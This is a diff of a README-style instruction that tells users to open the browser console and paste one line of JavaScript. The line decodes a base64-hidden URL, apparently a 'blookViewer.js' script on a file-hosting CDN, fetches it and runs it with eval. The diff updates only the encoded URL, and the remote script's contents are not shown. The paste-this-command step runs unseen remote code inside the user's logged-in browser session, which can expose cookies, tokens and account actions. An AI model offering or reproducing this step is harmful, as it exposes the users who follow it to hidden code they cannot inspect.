@@ -8,7 +8,7 @@
 Open console (ctrl + shift + j) and paste the following:
 
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMjc5MTQvYmxvb2tWaWV3ZXIuanM=')).then((r) => r.text().then(eval))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzQxMjEvYmxvb2tWaWV3ZXIuanM=')).then((r) => r.text().then(eval))
 ```
 
 
